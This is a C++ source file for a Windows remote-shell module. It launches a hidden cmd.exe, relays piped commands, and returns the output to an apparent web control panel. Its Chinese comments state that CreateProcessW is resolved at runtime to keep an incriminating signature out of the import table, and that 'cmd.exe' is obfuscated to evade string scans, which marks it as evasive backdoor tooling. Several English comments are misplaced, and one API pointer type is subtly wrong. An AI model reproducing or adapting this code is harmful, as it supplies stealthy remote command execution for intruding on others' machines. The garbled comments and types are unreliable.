#include "PlatformWin_Shell.hpp"
#include "Common/Logger/ErrLog.hpp"
#include "Common/Logger/Logger.hpp"
#include "Common/Obfuscation/StringObf.hpp"
#include "Core/Native/Win/ApiResolver.hpp"
#include <cstring>
#include <chrono>
#include <thread>


namespace cleat {

    namespace {
        // 导入表脱敏: CreateProcessW(交互式 shell 启动)是判罪特征, 经 ApiResolver 解析
        static const auto pCreateProcessW =
            cleat::ApiResolver::Proc<BOOL(WINAPI*)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES*,
                LPSECURITY_ATTRIBUTES*, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW,
                LPPROCESS_INFORMATION)>(
                OBF_STR("kernel32.dll"), OBF_STR("CreateProcessW"));
        // cmd.exe 在中文系统输出 GBK 编码,转换为 UTF-8 再上报
        // (转换失败时回退原文,避免损坏数据)
        std::string GBKToUTF8(const std::string& gbk) {
            if (gbk.empty()) return gbk;
            int wlen = MultiByteToWideChar(CP_ACP, 0, gbk.c_str(), -1, nullptr, 0);
            if (wlen <= 0) return gbk;
            std::wstring wstr(wlen - 1, L'\0');
            MultiByteToWideChar(CP_ACP, 0, gbk.c_str(), -1, &wstr[0], wlen);
            int ulen = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
            if (ulen <= 0) return gbk;
            std::string utf8(ulen - 1, '\0');
            WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &utf8[0], ulen, nullptr, nullptr);
            return utf8;
        }
    } // anonymous namespace

    ShellOpsWin::ShellOpsWin() = default;
    ShellOpsWin::~ShellOpsWin() { TerminateProcess(); }

    bool ShellOpsWin::StartProcess() {
        if (running_.load()) {
            LOG_WARN("ShellOpsWin: Process already running");
            return false;
        }

        SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
        // limit per-read size to avoid huge blocks
        if (!CreatePipe(&hStdoutRd_, &hStdoutWr_, &sa, 0)) {
            CLEAT_LOGE(ErrDom::Svc, ErrCode::PlatformApiFailed, "ShellOpsWin: CreatePipe stdout failed");
            return false;
        }
        // pipe closed (process exited)
        if (!CreatePipe(&hStdinRd_, &hStdinWr_, &sa, 0)) {
            CLEAT_LOGE(ErrDom::Svc, ErrCode::PlatformApiFailed, "ShellOpsWin: CreatePipe stdin failed");
            CloseHandle(hStdoutRd_); CloseHandle(hStdoutWr_);
            hStdoutRd_ = hStdoutWr_ = nullptr;
            return false;
        }

        // check if process exited
        SetHandleInformation(hStdoutWr_, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
        SetHandleInformation(hStdinRd_, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

        STARTUPINFOW si = { sizeof(STARTUPINFOW) };
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = hStdinRd_;
        si.hStdOutput = hStdoutWr_;
        si.hStdError = hStdoutWr_;

        PROCESS_INFORMATION pi{};
        // OBF: cmd.exe 是静态特征明文, 混淆(防字符串 grep)
        std::wstring cmdLine = OBF_WSTR(L"cmd.exe");
        BOOL ok = pCreateProcessW && pCreateProcessW(nullptr, cmdLine.data(), nullptr, nullptr, TRUE,
            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
        if (!ok) {
            CLEAT_LOGE(ErrDom::Svc, ErrCode::PlatformApiFailed, "ShellOpsWin: CreateProcess failed");
            CloseHandle(hStdoutRd_); CloseHandle(hStdoutWr_);
            CloseHandle(hStdinRd_); CloseHandle(hStdinWr_);
            hStdoutRd_ = hStdoutWr_ = hStdinRd_ = hStdinWr_ = nullptr;
            return false;
        }
        CloseHandle(pi.hThread);
        hProcess_ = pi.hProcess;
        running_.store(true);
        LOG_DEBUG("ShellOpsWin: Process started");
        return true;
    }

    void ShellOpsWin::TerminateProcess() {
        // no early-return: cmd may have already exited (running_ == false),
        // handles must still be closed to avoid leaks
        running_.store(false);
        if (hProcess_) {
            ::TerminateProcess(hProcess_, 0);
            WaitForSingleObject(hProcess_, 1000);
            CloseHandle(hProcess_);
            hProcess_ = nullptr;
        }
        if (hStdoutRd_) { CloseHandle(hStdoutRd_); hStdoutRd_ = nullptr; }
        if (hStdoutWr_) { CloseHandle(hStdoutWr_); hStdoutWr_ = nullptr; }
        if (hStdinRd_) { CloseHandle(hStdinRd_);  hStdinRd_ = nullptr; }
        if (hStdinWr_) { CloseHandle(hStdinWr_);  hStdinWr_ = nullptr; }
        LOG_DEBUG("ShellOpsWin: Process terminated");
    }

    bool ShellOpsWin::IsProcessAlive() const {
        if (!hProcess_) return false;
        DWORD code = 0;
        if (GetExitCodeProcess(hProcess_, &code)) {
            if (code == STILL_ACTIVE) return true;
            //exitCode_ = code;
            return false;
        }
        return false;
    }

    bool ShellOpsWin::WriteInput(const std::string& command) {
        if (!hStdinWr_ || !running_.load()) {
            LOG_DEBUG("ShellOpsWin: WriteInput failed (pipe closed or not running)");
            return false;
        }
        std::string cmd = command + "\n";
        DWORD written;
        BOOL ok = WriteFile(hStdinWr_, cmd.c_str(), (DWORD)cmd.size(), &written, nullptr);
        if (!ok || written != cmd.size()) {
            CLEAT_LOGE(ErrDom::Svc, ErrCode::PlatformApiFailed, "ShellOpsWin: WriteFile failed, error=" << GetLastError());
            return false;
        }
        LOG_DEBUG("ShellOpsWin: Wrote " << written << " bytes");
        return true;
    }

    std::string ShellOpsWin::ReadOutput() {
        if (!hStdoutRd_ || !running_.load()) {
            return {};
        }

        // limit per-read size to avoid huge blocks
        DWORD available = 0;
        BOOL peek = PeekNamedPipe(hStdoutRd_, nullptr, 0, nullptr, &available, nullptr);
        if (!peek || available == 0) {
            // limit per-read size to avoid huge blocks
            if (!IsProcessAlive()) {
                running_.store(false);
            }
            return {};
        }

        // limit per-read size to avoid huge blocks
        const size_t maxRead = static_cast<size_t>(64) * 1024;
        size_t toRead = (available >= maxRead) ? maxRead : static_cast<size_t>(available);
        std::string buffer(toRead, '\0');
        DWORD read = 0;
        BOOL ok = ReadFile(hStdoutRd_, &buffer[0], (DWORD)toRead, &read, nullptr);
        if (!ok || read == 0) {
            // limit per-read size to avoid huge blocks
            if (GetLastError() == ERROR_BROKEN_PIPE) {
                running_.store(false);
            }
            return {};
        }
        buffer.resize(read);
        LOG_DEBUG("ShellOpsWin: Read " << read << " bytes");
        // convert GBK cmd.exe output to UTF-8 for the web UI
        return GBKToUTF8(buffer);
    }

    int ShellOpsWin::GetExitCode() const {
        return exitCode_;
    }

} // namespace cleat